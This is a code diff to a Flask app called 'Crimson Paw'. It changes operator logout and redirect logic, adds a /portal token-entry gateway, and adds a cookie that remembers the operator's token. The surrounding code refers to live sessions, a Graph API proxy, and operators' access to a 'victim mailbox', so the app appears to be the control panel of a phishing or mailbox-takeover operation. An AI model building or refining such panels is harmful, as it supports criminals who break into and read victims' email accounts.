@@ -1,5 +1,5 @@
 # ── main.py ──────────────────────────────────────────────
-from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for, Response
+from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for, Response, make_response
 import re
 import logging
 import time
@@ -872,12 +872,17 @@ HTML_TEMPLATE = r'''
         body.role-operator #page-mailbox {
             display: block !important;
         }
+        body.role-operator .sidebar-header {
+            cursor: default !important;
+            pointer-events: none !important;
+            user-select: none;
+        }
     </style>
 </head>
 <body class="{{ 'role-operator' if user_role == 'operator' else 'role-admin' }}">
     <div class="sidebar" id="sidebar">
         <button type="button" class="toggle-btn" id="sidebar-toggle-btn" onclick="toggleSidebar()" title="Collapse sidebar">❮</button>
-        <div class="sidebar-header" onclick="handleBrandLogoClick()" style="display:flex; align-items:center; gap:10px; cursor:pointer;" title="Crimson Paw">
+        <div class="sidebar-header" {% if user_role != 'operator' %}onclick="handleBrandLogoClick()"{% endif %} style="display:flex; align-items:center; gap:10px; cursor:{{ 'default' if user_role == 'operator' else 'pointer' }};" title="Crimson Paw">
             <img src="/static/img/crimson_paw_logo.png" style="width:28px; height:28px; border-radius:6px; border:1px solid rgba(229,9,20,0.4); box-shadow:0 0 8px rgba(229,9,20,0.5);">
             <div style="display:flex; flex-direction:column; overflow:hidden;">
                 <span style="font-weight:900; letter-spacing:0.12em; color:#ffffff;">CRIMSON PAW</span>
@@ -893,7 +898,7 @@ HTML_TEMPLATE = r'''
         <div class="nav-item" id="nav-sessions" onclick="showPage('sessions', this)"><span class="nav-icon">📡</span><span class="nav-text">Live Sessions</span></div>
         <div class="nav-item" id="nav-operators" onclick="showPage('operators', this)"><span class="nav-icon">👥</span><span class="nav-text">Operators</span><span id="nav-badge-operators" style="display:none; font-size:10px; background:#58a6ff; color:#000; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
         <div class="nav-item" id="nav-settings" onclick="showPage('settings', this)"><span class="nav-icon">⚙️</span><span class="nav-text">Settings</span></div>
-        <div class="nav-item" id="nav-logout" onclick="window.location.href='/logout'" style="margin-top:auto; color:#ff6b72; border-top:1px solid #261115;"><span class="nav-icon">🚪</span><span class="nav-text">Logout</span></div>
+        <div class="nav-item" id="nav-logout" onclick="handleLogout()" style="margin-top:auto; color:#ff6b72; border-top:1px solid #261115;"><span class="nav-icon">🚪</span><span class="nav-text">Logout</span></div>
     </div>
 
     <div class="main-content">
@@ -3989,10 +3994,37 @@ HTML_TEMPLATE = r'''
 
         function handleBrandLogoClick() {
             if (currentUserRole === 'operator' || window.location.pathname.startsWith('/m/')) {
-                window.location.reload();
-            } else {
-                window.location.href = '/';
+                return false; // Strictly disabled for operators
             }
+            window.location.href = '/';
+        }
+
+        async function handleLogout() {
+            const opToken = '{{ operator_token if operator_token else "" }}' || (window.location.pathname.startsWith('/m/') ? window.location.pathname.split('/')[2] : '');
+            const isOperator = (currentUserRole === 'operator' || '{{ user_role }}' === 'operator' || !!opToken);
+            try {
+                const res = await fetch('/api/auth/logout', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: opToken })
+                });
+                const data = await res.json();
+                if (data && data.redirect) {
+                    window.location.href = data.redirect;
+                    return;
+                }
+            } catch (err) {
+                console.warn('Logout API error:', err);
+            }
+            if (isOperator) {
+                window.location.href = opToken ? ('/m/' + encodeURIComponent(opToken)) : '/portal';
+            } else {
+                window.location.href = '/login';
+            }
+        }
+
+        function performLogout() {
+            return handleLogout();
         }
 
         function copyCurrentOperatorAccountInfo() {
@@ -13026,16 +13058,25 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             <img src="/static/img/crimson_paw_logo.png" alt="Crimson Paw" class="brand-logo">
             <div class="brand-title">CRIMSON PAW</div>
             <div class="brand-subtitle">Operator Access Gateway</div>
-            <div class="portal-badge">PORTAL: /m/{{ token }}</div>
+            <div class="portal-badge">PORTAL: {% if token %}/m/{{ token }}{% else %}OPERATOR ACCESS GATEWAY{% endif %}</div>
         </div>
 
         <div id="op-alert" class="alert-box"></div>
 
         <!-- Step 1: Access Key Entry -->
         <form id="step-key" onsubmit="submitAccessKey(event)">
+            {% if not token %}
+            <div class="form-group">
+                <label class="form-label" for="op-portal-token">Portal Token / Identifier</label>
+                <input type="text" id="op-portal-token" class="form-input" placeholder="e.g. a1b2c3d4e5f6" autocomplete="off" required>
+                <div style="font-size:0.72rem; color:#705f63; margin-top:4px;">
+                    Enter your designated operator portal access token.
+                </div>
+            </div>
+            {% endif %}
             <div class="form-group">
                 <label class="form-label" for="op-key">Operator Access Key</label>
-                <input type="password" id="op-key" class="form-input" placeholder="••••••••••••" autocomplete="current-password" required autofocus>
+                <input type="password" id="op-key" class="form-input" placeholder="••••••••••••" autocomplete="current-password" required {% if token %}autofocus{% endif %}>
                 <div style="font-size:0.72rem; color:#705f63; margin-top:4px;">
                     Enter the access key generated for this operator account (e.g. CP-XXXX-XXXX).
                 </div>
@@ -13091,7 +13132,7 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
     </div>
 
     <script>
-        const portalToken = "{{ token }}";
+        let portalToken = "{{ token if token else '' }}";
         let opExpiryTimer = null;
         let opRemainingSec = 300;
 
@@ -13166,12 +13207,26 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             document.getElementById('step-setup-2fa').style.display = 'none';
             document.getElementById('step-verify-2fa').style.display = 'none';
             document.getElementById('op-alert').style.display = 'none';
-            document.getElementById('op-key').focus();
+            const tokInput = document.getElementById('op-portal-token');
+            if (tokInput) tokInput.focus();
+            else document.getElementById('op-key').focus();
         }
 
         async function submitAccessKey(e) {
             e.preventDefault();
             const btn = document.getElementById('btn-key');
+            let curToken = portalToken;
+            if (!curToken) {
+                const tokInput = document.getElementById('op-portal-token');
+                if (tokInput) {
+                    curToken = tokInput.value.trim().replace(/^.*\/m\//, '').replace(/\?.*$/, '');
+                }
+            }
+            if (!curToken) {
+                showAlert('Please enter your Portal Token / Identifier.');
+                return;
+            }
+            portalToken = curToken;
             const key = document.getElementById('op-key').value.trim();
             btn.disabled = true;
             btn.innerText = 'Verifying Hardware & Key...';
@@ -13352,7 +13407,7 @@ def require_admin_login():
         return None
     session.permanent = True
     # 2. Allow public home landing page, login, logout, preview showcase, and operator portal
-    if (request.path in ('/', '/landing', '/login', '/logout', '/preview', '/api/auth/login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
+    if (request.path in ('/', '/landing', '/login', '/logout', '/preview', '/portal', '/operator', '/api/auth/login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
         or request.path.startswith('/m/') 
         or request.path.startswith('/api/m/')
         or request.path == '/api/admin/client-lock'
@@ -13410,10 +13465,13 @@ def require_admin_login():
         op_id = session.get('operator_id')
         op_rec = db.get_operator(op_id) if op_id else None
         if not op_rec or op_rec.get('status') == 'disabled':
+            op_tok = session.get('operator_token')
             session.clear()
             if request.path.startswith('/api/'):
                 return jsonify({'error': 'Unauthorized: Operator account is disabled or missing.'}), 401
-            return redirect('/login')
+            if op_tok:
+                return redirect(f'/m/{op_tok}')
+            return redirect('/portal')
 
         # ── ANTI-ACCOUNT SHARING: ZERO-CONCURRENCY SESSION NONCE VALIDATION ──
         sess_nonce = session.get('session_nonce')
@@ -13450,7 +13508,7 @@ def require_admin_login():
         if not is_allowed:
             if request.path.startswith('/api/'):
                 return jsonify({'error': 'Forbidden: Operator accounts can only access the Mailbox module.'}), 403
-            portal_url = f"/m/{session.get('operator_token')}" if session.get('operator_token') else "/dashboard"
+            portal_url = f"/m/{session.get('operator_token')}" if session.get('operator_token') else "/portal"
             return redirect(portal_url)
 
         # For /api/graph_proxy/* enforce that requested user_code is assigned to this operator
@@ -13460,6 +13518,22 @@ def require_admin_login():
                 return jsonify({'error': {'message': 'Forbidden: You do not have permission to access this victim mailbox.'}}), 403
 
     return None
+
+@app.route('/portal')
+@app.route('/operator')
+def operator_portal_gateway():
+    # If active authenticated operator session exists, take them directly into their portal
+    if session.get('authenticated') and session.get('role') == 'operator' and session.get('operator_token'):
+        return redirect(f"/m/{session.get('operator_token')}")
+
+    # Check for token in query param, session, or remembered cookie
+    tok = request.args.get('token') or session.get('operator_token') or request.cookies.get('last_operator_token')
+    if tok:
+        op = db.get_operator_by_token(tok)
+        if op:
+            return redirect(f"/m/{tok}")
+
+    return render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token='', op=None)
 
 @app.route('/m/<token>')
 def operator_codified_portal(token):
@@ -13472,10 +13546,14 @@ def operator_codified_portal(token):
     # Check if currently authenticated as this operator
     if session.get('authenticated') and session.get('role') == 'operator' and session.get('operator_id') == op['id']:
         session.permanent = True
-        return render_template_string(HTML_TEMPLATE, user_role='operator', user_name=op.get('username', 'Operator'), operator_token=token)
+        resp = make_response(render_template_string(HTML_TEMPLATE, user_role='operator', user_name=op.get('username', 'Operator'), operator_token=token))
+        resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
+        return resp
 
     # Render dedicated Operator Portal Gateway directly on /m/<token>
-    return render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token=token, op=op)
+    resp = make_response(render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token=token, op=op))
+    resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
+    return resp
 
 # ── Operator Portal Gateway API Endpoints ─────────────────────────
 _pending_op_2fa = {}  # token -> {'otp': str, 'expires_at': float, 'attempts': int}
@@ -13654,7 +13732,9 @@ def api_operator_portal_verify_2fa(token):
         session['operator_token'] = token
         session['session_nonce'] = session_nonce
         session['device_hash'] = op.get('bound_device_hash') or dev_hash
-        return jsonify({'success': True, 'redirect': f'/m/{token}'})
+        resp = jsonify({'success': True, 'redirect': f'/m/{token}'})
+        resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
+        return resp
     else:
         pend['attempts'] += 1
         if pend['attempts'] >= 5:
@@ -13722,14 +13802,40 @@ def api_session_expire(user_code):
 @app.route('/login', methods=['GET', 'POST'])
 def login_route():
     if session.get('authenticated'):
-        if session.get('role') == 'operator' and session.get('operator_token'):
-            return redirect(f"/m/{session.get('operator_token')}")
+        if session.get('role') == 'operator':
+            if session.get('operator_token'):
+                return redirect(f"/m/{session.get('operator_token')}")
+            return redirect('/portal')
         return redirect('/dashboard')
     return render_template_string(CRIMSON_PAW_LOGIN_HTML)
 
 @app.route('/logout', methods=['GET', 'POST'])
 def logout_route():
+    is_operator = (session.get('role') == 'operator')
+    op_token = session.get('operator_token') or request.args.get('token')
+    
+    if not op_token and request.referrer and '/m/' in request.referrer:
+        try:
+            part = request.referrer.split('/m/')[1]
+            op_token = part.split('?')[0].split('/')[0].split('#')[0].strip()
+        except Exception:
+            pass
+
+    if (is_operator or request.args.get('token')) and not op_token and session.get('operator_id'):
+        try:
+            op_rec = db.get_operator(session.get('operator_id'))
+            if op_rec and op_rec.get('token'):
+                op_token = op_rec.get('token')
+        except Exception:
+            pass
+
+    if not op_token and request.cookies.get('last_operator_token'):
+        op_token = request.cookies.get('last_operator_token')
+
     session.clear()
+
+    if is_operator or request.args.get('token'):
+        return redirect(f"/m/{op_token}" if op_token else "/portal")
     return redirect('/login')
 
 # ── Brute Force Lockout & Telegram 2FA State ───────────────────────
@@ -14013,8 +14119,26 @@ def api_operator_telegram():
 
 @app.route('/api/auth/logout', methods=['POST'])
 def api_auth_logout():
+    is_operator = (session.get('role') == 'operator')
+    op_token = session.get('operator_token') or request.args.get('token')
+    if not op_token and request.referrer and '/m/' in request.referrer:
+        try:
+            part = request.referrer.split('/m/')[1]
+            op_token = part.split('?')[0].split('/')[0].split('#')[0].strip()
+        except Exception:
+            pass
+    if is_operator and not op_token and session.get('operator_id'):
+        try:
+            op_rec = db.get_operator(session.get('operator_id'))
+            if op_rec and op_rec.get('token'):
+                op_token = op_rec.get('token')
+        except Exception:
+            pass
+    if not op_token and request.cookies.get('last_operator_token'):
+        op_token = request.cookies.get('last_operator_token')
     session.clear()
-    return jsonify({'success': True})
+    redirect_url = f'/m/{op_token}' if (is_operator and op_token) else ('/portal' if is_operator else '/login')
+    return jsonify({'success': True, 'redirect': redirect_url})
 
 @app.route('/api/auth/me', methods=['GET'])
 def api_auth_me():
